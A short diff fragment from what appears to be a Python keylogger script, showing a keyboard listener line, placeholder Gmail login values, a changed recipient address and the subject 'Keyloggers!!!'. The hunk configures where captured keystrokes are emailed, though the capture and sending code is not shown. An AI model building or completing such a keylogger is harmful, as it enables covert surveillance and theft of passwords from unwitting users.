@@ -36,7 +36,7 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
 
 email_user = 'yourmail@gmail.com'
 email_password = 'yourpassword'
-email_send = 'sendermail@gmail.com'
+email_send = 'receiver@gmail.com'
 
 subject = 'Keyloggers!!!'
 
